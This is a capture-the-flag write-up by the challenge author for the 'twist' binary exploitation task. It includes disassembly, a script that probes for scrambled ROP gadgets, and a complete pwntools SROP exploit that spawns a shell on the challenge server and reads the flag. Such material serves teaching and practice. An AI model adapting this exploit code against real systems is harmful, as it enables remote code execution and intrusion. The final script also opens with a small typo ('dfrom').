# twist

## Description

Did you play twist at ICC? We did. 

0.cloud.chals.io:13658

Author: [v10l3nt](https://www.tjoconnor.org/vita)

## Files

* [twist](files/twist)

## Solution


Running the binary produces the following output 

```
--------------------------------------------------------------------------------------------
     Welcome to Twist v2.0. Some file contents may have shifted on upload.                  
--------------------------------------------------------------------------------------------
     Debug Mode Enabled; calling 0x401385
--------------------------------------------------------------------------------------------
    (nil) | 0x401490 |    (nil) |    (nil) |    (nil) |     0x2d
--------------------------------------------------------------------------------------------
     You can dance in a hurricane but only if you are standing in the eye >>> 
```

The critical thing to observe here is that the binary is most likely different on the local and remote hosts.

**Some file contents may have shifted on upload.**

The binary contains a series of functions containing ROP gadgets for ``[pop rax; ret], [pop rbx; ret], [pop rcx; ret], [pop rdx; ret], [syscall; ret], [pop rdi; ret], [pop rsi; ret],`` When dissassembled each of these functions looks similar 

```
[local version of twist]
00401373  55                 push    rbp {var_8}
00401374  4889e5             mov     rbp, rsp
00401377  5f                 pop     rdi {var_8}
00401378  c3                 retn     
0040137a  5d                 pop     rbp {__return_addr}
0040137b  c3                 retn     
```

Why are there two returns? Probably because the challenge author (myself) wrote it something like this in C. We can probably take advantage of that later. 

```
void pop_rdi() {
    asm("pop %rdi; ret;");
}
```

We see that we have both ``pop rax; ret`` and ``syscall; ret`` setting conditions for an SROP exploit. So we quickly write a [local exploit for twist](pwn-twistlocal.py). The basis of that exploit is just building a malicious SigreturnFrame like below. 

```python
def srop_exec():
    chain = p64(pop_rax)
    chain += p64(0xf)
    chain += p64(syscall_ret)

    frame = SigreturnFrame(arch="amd64", kernel="amd64")
    frame.rax = constants.SYS_execve
    frame.rdi = bin_sh
    frame.rip = syscall_ret

    return chain+bytes(frame)
```

However, throwing this exploit at the server fails, and we are reminded

**Some file contents may have shifted on upload.**

So we can examine where the local and remote binaries are probably different. Our first hint comes by examining some information the program leaks. We notice that both the remote and local versions of the binary produce the following static address leak: ``Debug Mode Enabled; calling 0x401385``. Since this function comes after the address space of all the gadgets, we can assume the challenge author (myself) scrambled the order of the gadgets. From ``pop rax; ret`` at ``0x00401349`` to ``debug_mode`` at ``0x401385`` is only 0x3c (60) bytes. A less elegant solution could try 60 x 60 = 3,600 different attempts for the ``pop rax; ret`` and ``syscall; ret`` and see which one lands our SROP exploit. However, since we included a ``debug_mode()`` that prints the output of the registers, we write a small script to use ``debug_mode()``.

```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 13658, level="error")
    else:
        return process(e.path, level="error")

def debug_mode(gadget):
    p = start()
    pad = cyclic(16)

    chain = p64(0x401016)  # ret
    chain += p64(gadget)   # gadget 
    chain += p64(0x1337)   # value
    chain += p64(0x401446) # call debug_mode

    p.recvuntil(b'Debug Mode Enabled')
    p.recvline()
    p.recvline()
    p.recvline()
    p.recvline()

    p.sendline(pad+chain)
    p.recvline()
    info("%s" %p.recvline().decode())


pop_rax = e.sym['pop_rax']+0x4
debug_mode(pop_rax)
```

Testing locally produces the following output when we call the ``pop_rax; ret`` gadget and place ``0x1337`` on the stack. This appropriately results in ``rax`` being set to ``0x1337``. 

```
$ python3 test.py BIN=./twist
[*]    0x1337 | 0x401490 | 0x7fd0168a59a0 |    (nil) | 0x7fd0168a8680 | 0x1bdd6b1
```

Running the same script remotely produces different output, where now the ``rbx`` register is set to ``0x1337`` 

```
$ python3 test.py BIN=./twist REMOTE
[*]     (nil) |   0x1337 | 0x7fd0674f89a0 |    (nil) | 0x7fd0674fb680 | 0x7fd0674f8a23
```

Ok, we confirmed our hypothesis that the gadgets just got scrambled. Now we need to find where ``pop rax; ret`` resides in the remote binary by testing the address space from the local binary addreses of the functions ``pop_rax()`` to ``debug_mode()``. So we write a script that tests these addresses and identifies the following addresses that also do not segfault. At this point, we have the addresses for gadgets for ``pop r(ax|bx|cx|dx|di|si); ret``. But we do not have the ``syscall ret``. Arguably at this point, we could try our exploit with the 59 potential addresses for ``syscall; ret`` and walk away. But let us continue.

```
[remote version of twist]
[*] Starting pop rax gadget search between 0x401349 to 0x401385
[*] Gadget [0x401349]: pop rbx; ret
[*] Gadget [0x40134b]: [b'    (nil) ', b' 0x401490 ', b' 0x7fb56d8f49a0 ', b'    (nil) ', b' 0x7fb56d8f7680 ', b' 0x7fb56d8f4a23\n']
[*] Gadget [0x40134c]: [b'    (nil) ', b' 0x401490 ', b' 0x7f8f6e4b09a0 ', b'    (nil) ', b' 0x7f8f6e4b3680 ', b' 0x7f8f6e4b0a23\n']
[*] Gadget [0x401355]: [b'    (nil) ', b' 0x401490 ', b' 0x7f3ed7c289a0 ', b'    (nil) ', b' 0x7f3ed7c2b680 ', b' 0x7f3ed7c28a23\n']
[*] Gadget [0x401356]: [b'    (nil) ', b' 0x401490 ', b' 0x7f8e9323d9a0 ', b'    (nil) ', b' 0x7f8e93240680 ', b' 0x7f8e9323da23\n']
[*] Gadget [0x401359]: pop rdi; ret
[*] Gadget [0x40135a]: pop rdi; ret
[*] Gadget [0x40135c]: pop rdi; ret
[*] Gadget [0x40135e]: [b'    (nil) ', b' 0x401490 ', b' 0x7f27029fb9a0 ', b'    (nil) ', b' 0x7f27029fe680 ', b' 0x7f27029fba23\n']
[*] Gadget [0x40135f]: [b'    (nil) ', b' 0x401490 ', b' 0x7fcd8bd309a0 ', b'    (nil) ', b' 0x7fcd8bd33680 ', b' 0x7fcd8bd30a23\n']
[*] Gadget [0x401362]: pop rcx; ret
[*] Gadget [0x401363]: pop rcx; ret
[*] Gadget [0x401365]: pop rcx; ret
[*] Gadget [0x401367]: [b'    (nil) ', b' 0x401490 ', b' 0x7fa06dd739a0 ', b'    (nil) ', b' 0x7fa06dd76680 ', b' 0x7fa06dd73a23\n']
[*] Gadget [0x401368]: [b'    (nil) ', b' 0x401490 ', b' 0x7f04456d49a0 ', b'    (nil) ', b' 0x7f04456d7680 ', b' 0x7f04456d4a23\n']
[*] Gadget [0x40136b]: pop rax; ret
[*] Gadget [0x40136c]: pop rax; ret
[*] Gadget [0x40136e]: pop rax; ret
[*] Gadget [0x401370]: [b'    (nil) ', b' 0x401490 ', b' 0x7fbab0fa79a0 ', b'    (nil) ', b' 0x7fbab0faa680 ', b' 0x7fbab0fa7a23\n']
[*] Gadget [0x401371]: [b'    (nil) ', b' 0x401490 ', b' 0x7fecec5949a0 ', b'    (nil) ', b' 0x7fecec597680 ', b' 0x7fecec594a23\n']
[*] Gadget [0x401374]: pop rdx; ret
[*] Gadget [0x401375]: pop rdx; ret
[*] Gadget [0x401377]: pop rdx; ret
[*] Gadget [0x401379]: [b'    (nil) ', b' 0x401490 ', b' 0x7f25f7d9b9a0 ', b'    (nil) ', b' 0x7f25f7d9e680 ', b' 0x7f25f7d9ba23\n']
[*] Gadget [0x40137a]: [b'    (nil) ', b' 0x401490 ', b' 0x7f1b7e64b9a0 ', b'    (nil) ', b' 0x7f1b7e64e680 ', b' 0x7f1b7e64ba23\n']
[*] Gadget [0x40137d]: pop rsi; ret
[*] Gadget [0x40137e]: pop rsi; ret
[*] Gadget [0x401380]: pop rsi; ret
[*] Gadget [0x401382]: [b'    (nil) ', b' 0x401490 ', b' 0x7fa92bdd49a0 ', b'    (nil) ', b' 0x7fa92bdd7680 ', b' 0x7fa92bdd4a23\n']
[*] Gadget [0x401383]: [b'    (nil) ', b' 0x401490 ', b' 0x7f9ed17639a0 ', b'    (nil) ', b' 0x7f9ed1766680 ', b' 0x7f9ed1763a23\n']
--------------------------------------------------------------------------------------------
```

It appears as if three addresses successfully populate each register. Remembering the earlier disassembly of our local binary, we see the following gadgets that can come out of each function. We see thre gadgets that will ``pop rdi; ret``;  followed by two ``pop rbp; ret`` gadgets. 

```
[local version of twist]
00401373  55                 push    rbp {var_8}
00401374  4889e5             mov     rbp, rsp [*]--------->[*] Gadget [0x401374]: mov rbp; rsp; pop rdi; ret;
---------------------------------------------------------->[*] Gadget [0x401375]: mov ebp, esp; pop rdi; ret;
00401377  5f                 pop     rdi {var_8}---------->[*] Gadget [0x401377]: pop rdi; ret;
00401378  c3                 retn------------------------->[*] Gadget [0x40137a]: ret; pop rbp; ret; 
0040137a  5d                 pop     rbp {__return_addr})->[*] Gadget [0x40137b]: pop rbp; ret;
0040137b  c3                 retn     					 
```

But what about this output? Why does ``pop rbx; ret`` have four successive ``pop rbp; ret`` gadgets instead of two successive like the others? It is probably because the ``pop rbp; ret`` gadgets are from the ``syscall_ret()`` function. We can test this on the local binary to confirm, and see syscall_ret gadget. 


```
[local version of twist]
[*] Gadget [0x401364]: pop rdx; ret
[*] Gadget [0x401366]: [b'    (nil) ', b' 0x401490 ', b' 0x7f7cf16f69a0 ', b'    (nil) ', b' 0x7f7cf16f9680 ', b' 0xd916b1\n']
[*] Gadget [0x401367]: [b'    (nil) ', b' 0x401490 ', b' 0x7f43d89d89a0 ', b'    (nil) ', b' 0x7f43d89db680 ', b' 0xbe66b1\n']
-------> address of syscall; ret gadget == 0x40136d
[*] Gadget [0x401370]: [b'    (nil) ', b' 0x401490 ', b' 0x7f74f2e459a0 ', b'    (nil) ', b' 0x7f74f2e48680 ', b' 0x12626b1\n']
[*] Gadget [0x401371]: [b'    (nil) ', b' 0x401490 ', b' 0x7f5ebd1c49a0 ', b'    (nil) ', b' 0x7f5ebd1c7680 ', b' 0xe296b1\n']
[*] Gadget [0x401374]: pop rdi; ret
```

Finally, we can go ahead and automate our solution, we will loop the 60 bytes of address space betwen the local binary addresses of ``pop_rax()`` to the static ``debug_mode()`` address and try to resolve our ``pop_rax; ret`` and ``syscall; ret`` gadgets; then throw our original SROP exploit. Note, we made the assumption ``/bin/sh\0`` did not move. If that did not work, next step would have been to go back and make a new ``/bin/sh\0`` with all of our newly discovered gadgets, by reading ``/bin/sh\0`` into writeable memory with a ``syscall_READ`` (using all our discovered gadgets.) Our script produces the following output and flag.

```
$ python3 pwn-twist.py BIN=./twist REMOTE
[*] Starting pop rax gadget search between 0x401349 to 0x401385
... snipped..
[*] [pop rax; ret] discovered at 0x40136e
[*] [syscall; ret] discovered at 0x401352
[*] [/bin/sh] discovered at 0x40289e
--------------------------------------------------------------------------------------------
    (nil) | 0x401490 |    (nil) |    (nil) | 0x7f018c98d670 | 0x7ffce1930910
--------------------------------------------------------------------------------------------
     You can dance in a hurricane but only if you are standing in the eye >>> $ cat flag.txt
uscg{a_dr0p_1n_th3_0c3an_has_0_fe3r_0f_hurr1can3s}
```

Our full working exploit follows:

```python
dfrom pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 13658, level="error")
    else:
        return process(e.path, level="error")


''' debug mode prints out
  rax | rbx | rcx | rdx | rdi | rsi 
'''


def gadget_finder(s):
    regs = s.split(b'|')
    if b'0x1337' in regs[0]:
        return 'pop rax; ret'
    elif b'0x1337' in regs[1]:
        return 'pop rbx; ret'
    elif b'0x1337' in regs[2]:
        return 'pop rcx; ret'
    elif b'0x1337' in regs[3]:
        return 'pop rdx; ret'
    elif b'0x1337' in regs[4]:
        return 'pop rdi; ret'
    elif b'0x1337' in regs[5]:
        return 'pop rsi; ret'
    else:
        return regs


def find_pop_rax():

    pop_rax = 0x0
    syscall_ret = 0x0
    pop_rbp_ret = 0x0

    ''' loop from first gadget to debug mode '''
    for gadget in range(gadgets_start, debug_mode):
        try:
            p = start()
            pad = cyclic(16)

            ''' chain to display gadgets
       align stack, call gadget, test val, call debug '''

            chain = p64(0x401016)
            chain += p64(gadget)
            chain += p64(0x1337)
            chain += p64(0x401446)

            ''' parse out program output '''
            p.recvuntil(b'Debug Mode Enabled')
            p.recvline()
            p.recvline()
            p.recvline()
            p.recvline()

            ''' send gadget test and receive outpt'''
            p.sendline(pad+chain)
            p.recvline()
            gadget_result = gadget_finder(p.recvline())
            info("Gadget [%s]: %s" % (hex(gadget), gadget_result))
           
            if 'pop rax; ret' in gadget_result:
                pop_rax = gadget

            if 'pop' in gadget_result:
                pop_rbp_ret = 0
            else:
                pop_rbp_ret+=1
            if (pop_rbp_ret==3):
                syscall_ret = gadget - 0x3
        except:

            pass
    return pop_rax, syscall_ret



def srop_exec(pop_rax, bin_sh, syscall_ret):

    chain = p64(pop_rax)
    chain += p64(0xf)
    chain += p64(syscall_ret)

    frame = SigreturnFrame(arch="amd64", kernel="amd64")
    frame.rax = constants.SYS_execve
    frame.rdi = bin_sh
    frame.rip = syscall_ret

    p = start()
    pad = cyclic(16)
    p.recvuntil(b'Debug Mode Enabled; calling ')
    p.recvline()
    p.sendline(pad+chain+bytes(frame))
    p.interactive()

gadgets_start = e.sym['pop_rax']+4
p = start()
p.recvuntil(b'Debug Mode Enabled; calling ')
debug_mode = int(p.recvline(), 16)
p.close()

info("Starting pop rax gadget search between %s to %s" %(hex(gadgets_start),hex(debug_mode)))
pop_rax,syscall_ret = find_pop_rax()

info("[pop rax; ret] discovered at %s" % hex(pop_rax))
info("[syscall; ret] discovered at %s" % hex(syscall_ret))
bin_sh = next(e.search(b'/bin/sh'))
info("[/bin/sh] discovered at %s", hex(bin_sh))
srop_exec(pop_rax ,bin_sh, syscall_ret)
```

